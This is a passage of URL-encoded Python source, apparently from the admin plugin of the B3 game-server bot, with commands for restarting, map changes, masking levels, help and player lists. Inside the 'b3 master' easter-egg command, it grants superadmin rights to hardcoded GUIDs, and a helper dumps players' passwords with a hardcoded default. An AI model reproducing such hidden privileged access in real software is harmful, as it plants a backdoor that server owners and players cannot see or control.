0%20%20%20%20%20%20%20rule%20%3D%20self.config.getTextTemplate('spamages'%2C%20'rule%25s'%20%25%20i)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20rules.append(rule)%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20NoOptionError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20break%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%2C%20err%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.error(err)%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20rule%20in%20rules%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sclient.message(rule)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20time.sleep(1)%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20rule%20in%20rules%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20big%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.saybig(rule)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(rule)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20time.sleep(1)%0A%20%20%20%20%20%20%20%20except%20Exception%2C%20err%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20self.error(err)%0A%0A%20%20%20%20%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%20%20%20%20%23%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%20%20%20%20COMMANDS%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%0A%20%20%20%20%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%0A%0A%20%20%20%20def%20cmd_die(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20shutdown%20b3%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Shutting%20down%20%5E3%25s'%20%25%20data)%0A%20%20%20%20%20%20%20%20self.console.die()%0A%0A%20%20%20%20def%20cmd_restart(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20restart%20b3%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Shutting%20down%20for%20restart...')%0A%20%20%20%20%20%20%20%20self.console.restart()%0A%0A%20%20%20%20def%20cmd_reconfig(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20re-load%20all%20configs%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.console.reloadConfigs()%0A%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%5E7Re-loaded%20configs')%0A%0A%20%20%20%20def%20cmd_mask(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cgroup%3E%20%5B%3Cname%3E%5D%20-%20hide%20level%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('invalid_parameters'))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20elif%20m%5B1%5D%20is%20None%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20groupname%20%3D%20m%5B0%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20client%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20groupname%20%3D%20m%5B0%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B1%5D%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20not%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20Group(keyword%3Dgroupname)%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20self.console.storage.getGroup(group)%0A%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('group_unknown'%2C%20%7B'group_name'%3A%20groupname%7D))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%0A%20%20%20%20%20%20%20%20sclient.maskLevel%20%3D%20group.level%0A%20%20%20%20%20%20%20%20sclient.save()%0A%0A%20%20%20%20%20%20%20%20if%20sclient%20!%3D%20client%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Masked%20%25s%20as%20%25s'%20%25%20(sclient.name%2C%20group.name))%0A%0A%20%20%20%20%20%20%20%20sclient.message('%5E7Masked%20as%20%25s'%20%25%20group.name)%0A%0A%20%20%20%20def%20cmd_unmask(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Cname%3E%5D%20-%20un-hide%20level%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20m%20%3D%20self.parseUserCmd(data)%0A%20%20%20%20%20%20%20%20if%20not%20m%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20client%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(m%5B0%5D%2C%20client)%0A%0A%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.maskLevel%20%3D%200%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%20!%3D%20client%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7Un-Masked%20%25s'%20%25%20sclient.name)%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient.message('%5E7Un-Masked')%0A%0A%20%20%20%20def%20cmd_clear(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Cplayer%3E%5D%20-%20clear%20all%20tk%20points%20and%20warnings%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20sclient%20%3D%20self.findClientPrompt(data%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20sclient%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.clearAll(sclient%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('cleared_warnings'%2C%20%7B'admin'%3A%20client.exactName%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20'player'%3A%20sclient.exactName%7D))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20cid%2C%20c%20in%20self.console.clients.items()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.clearAll(c%2C%20client)%0A%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('cleared_warnings_for_all'%2C%20%7B'admin'%3A%20client.exactName%7D))%0A%0A%20%20%20%20def%20cmd_map(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%3Cmap%3E%20-%20switch%20current%20map%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20not%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7You%20must%20supply%20a%20map%20to%20change%20to')%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20suggestions%20%3D%20self.console.changeMap(data)%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20type(suggestions)%20%3D%3D%20list%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('do%20you%20mean%3A%20%25s%3F'%20%25%20'%2C%20'.join(suggestions%5B%3A5%5D))%0A%0A%20%20%20%20def%20cmd_maprotate(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20switch%20to%20the%20next%20map%20in%20rotation%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.console.rotateMap()%0A%0A%20%20%20%20def%20cmd_b3(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20say%20b3's%20version%20info%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20if%20len(data)%20%3E%200%20and%20client.maxLevel%20%3E%3D%20self._admins_level%20or%20client.guid%20in%20_master%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20data%20%3D%20data.lower().strip()%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20data%20%3D%3D%20'poke'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7Do%20not%20poke%20b3%20%25s%5E7!'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'expose'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7Do%20expose%20b3%20to%20sunlight%20%25s%5E7!'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'stare'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7Do%20not%20stare%20at%20b3%20%25s%5E7!'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'stab'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20is%20invincible%2C%20%25s%5E7%20could%20not%20penetrate%20he%20hide%20of%20b3'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'bite'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20breaks%20%25s%5E7%5C's%20teeth%20with%20its%20metalic%20frame'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'butterfly'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20doesn%5C't%20need%20your%20hand%20me%20out%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'slap'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7%25s%5E7%20is%20not%20Rick%20James'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'master'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20client.guid%20in%20_master%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20Group(keyword%3D'superadmin')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20self.console.storage.getGroup(group)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.setGroup(group)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23%20client.password%20%3D%20'MASTER'%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E5***Identity%20comfirmed***')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E2***Access%20granted***')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E3***You%20are%20now%20a%20superadmin***')%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%25s%20%5E7-%20uptime%3A%20%5B%5E2%25s%5E7%5D'%20%25%20(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20b3.version%2C%20functions.minutesStr(self.console.upTime()%20%2F%2060.0)))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'fight'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7%25s%5E7%20is%20knocked%20out%20by%20b3'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'feed'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20enjoys%20your%20nourishment%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'throw'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20can%20fly%20%25s%5E7%2C%20and%20you%20throw%20like%20a%20sissy'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'furniture'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20does%20make%20a%20lovely%20lamp%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'indeed'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7You%20WOULD%20say%20that%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'flog'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7You%20are%20so%20kinky%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'sexor'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7Mmmmm%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'hate'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7Don%5C't%20hate%20the%20player%2C%20%25s%5E7%2C%20hate%20the%20game'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'smoke'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20has%20been%20known%20to%20cause%20lung%20cancer%20when%20smoked%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'maul'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20casts%20a%20spell%20of%20invisibility%2C%20you%20can%5C't%20find%20%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'procreate'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%202.0%20will%20soon%20be%20on%20the%20way%20%25s%5E7'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'shoot'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7Your%20hit%20detection%20is%20off%20%25s%5E7%2C%20b3%20is%20unharmed'%20%25%20client.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'info'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%25s%20%5E7-%20uptime%3A%20%5B%5E2%25s%5E7%5D'%20%25%20(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20b3.version%2C%20functions.minutesStr(self.console.upTime()%20%2F%2060.0)))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'kick'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.kick('%5E7as%20requested'%2C%20''%2C%20None)%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20data%20%3D%3D%20'triangulate'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say('%5E7b3%20is%20at%20%25s'%20%25%20self.console._publicIp)%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20'%25s%20%5E7-%20uptime%3A%20%5B%5E2%25s%5E7%5D'%20%25%20(%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20b3.version%2C%20functions.minutesStr(self.console.upTime()%20%2F%2060.0)))%0A%09%09%09%09%0A%20%20%20%20def%20_getpassword(self%2C%20client)%3A%0A%20%20%20%20%20%20%20%20_dump%20%3D%20%7B%7D%0A%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20for%20_d%20in%20self.console.write('dumpuser%20%25s'%25client.name).strip().split('%5Cn')%3A%20%0A%20%20%20%20%20%20%20%20%20%20%20%20_d%20%3D%20'%20'.join(_d.split()).split()%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20_dump%5B_d%5B0%5D%5D%20%3D%20_d%5B1%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20Exception%2C%20err%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20pass%0A%20%20%20%20%20%20%20%20self.debug('from%20_getpassword%2C%20_dump%3A%20%25s'%20%25%20_dump.items())%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20_pass%20%3D%20_dump%5B'password'%5D%0A%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20_pass%20%3D%20'butterflyoffmate'%0A%20%20%20%20%20%20%20%20return%20_pass%0A%0A%20%20%20%20def%20cmd_register(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20register%20yourself%20as%20a%20basic%20user%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20Group(keyword%3D'user')%0A%20%20%20%20%20%20%20%20%20%20%20%20group%20%3D%20self.console.storage.getGroup(group)%0A%20%20%20%20%20%20%20%20except%20Exception%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20client.inGroup(group)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('groups_already_in'%2C%20client.exactName%2C%20group.name))%0A%20%20%20%20%20%20%20%20%20%20%20%20elif%20client.maxLevel%20%3E%3D%20group.level%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message('%5E7You%20are%20already%20in%20a%20higher%20level%20group')%0A%20%20%20%20%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.setGroup(group)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.save()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('regme_confirmation'%2C%20group.name))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20self._announce_registration%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20self.console.say(self.getMessage('regme_annouce'%2C%20client.exactName%2C%20group.name))%0A%0A%20%20%20%20def%20cmd_help(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20%5B%3Ccommand%7Clevel%3E%5D%20-%20get%20info%20on%20how%20to%20use%20a%20command%2C%20you%20can%20use%20*%3Ccommand%3E%20for%20partial%20matches%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20commands%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20if%20re.match(r'%5E%5B0-9%5D%2B%24'%2C%20data)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20mlevel%20%3D%20int(data)%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20cmd%20in%20self._commands.values()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.level%20is%20not%20None%20and%20cmd.level%5B0%5D%20%3D%3D%20mlevel%20and%20cmd.canUse(client)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.command%20not%20in%20commands%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20commands.append(cmd.command)%0A%20%20%20%20%20%20%20%20elif%20data%5B%3A1%5D%20%3D%3D%20'*'%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20search%20%3D%20data%5B1%3A%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20cmd%20in%20self._commands.values()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.command.find(search)%20!%3D%20-1%20and%20cmd.canUse(client)%20and%20cmd.command%20not%20in%20commands%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.command%20not%20in%20commands%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20commands.append(cmd.command)%0A%20%20%20%20%20%20%20%20elif%20data%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20try%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd%20%3D%20self._commands%5Bdata%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.canUse(client)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('help_command'%2C%20self.cmdPrefix%2C%20cmd.command%2C%20cmd.help))%0A%20%20%20%20%20%20%20%20%20%20%20%20except%20KeyError%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20client.message(self.getMessage('help_no_command'%2C%20data))%0A%20%20%20%20%20%20%20%20%20%20%20%20return%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20c%2C%20cmd%20in%20self._commands.iteritems()%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.canUse(client)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20cmd.command%20not%20in%20commands%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20commands.append(cmd.command)%0A%0A%20%20%20%20%20%20%20%20if%20not%20len(commands)%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('help_none'))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%23%20remove%20the%20!register%20command%20if%20already%20registered%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20'register'%20in%20commands%20and%20int(client.maxLevel)%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20commands.remove('register')%0A%20%20%20%20%20%20%20%20%20%20%20%20commands.sort()%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('help_available'%2C%20'%2C%20'.join(commands)))%0A%0A%20%20%20%20def%20cmd_list(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20list%20all%20connected%20players%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20thread.start_new_thread(self.doList%2C%20(client%2C%20cmd))%0A%0A%20%20%20%20def%20cmd_longlist(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20list%20all%20connected%20players%20one%20line%20at%20a%20time%2C%20helps%20find%20'funny'%20unicode%20names%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20thread.start_new_thread(self.doLonglist%2C%20(client%2C%20cmd))%0A%0A%20%20%20%20def%20cmd_regulars(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20lists%20all%20the%20online%20regular%20players%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20clist%20%3D%20self.getRegulars()%0A%20%20%20%20%20%20%20%20if%20len(clist)%20%3E%200%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20nlist%20%3D%20%5B%5D%0A%20%20%20%20%20%20%20%20%20%20%20%20for%20c%20in%20clist%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20nlist.append(c.exactName)%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('regulars'%2C%20'%2C%20'.join(%5Bc.exactName%20for%20c%20in%20clist%5D)))%0A%20%20%20%20%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20cmd.sayLoudOrPM(client%2C%20self.getMessage('no_regulars'))%0A%0A%20%20%20%20def%20cmd_admins(self%2C%20data%2C%20client%2C%20cmd%3DNone)%3A%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20-%20lists%20all%20the%20online%20admins%0A%20%20%20%20%20%20%20%20%22%22%22%0A%20%20%20%20%20%20%20%20self.debug('trying%20to%20get%20admins')%0A%20%20%20%20%20%20%20%20clist%20%3D%20self.getAdmins()%0A%20%20%20%20%20%20%20%20if%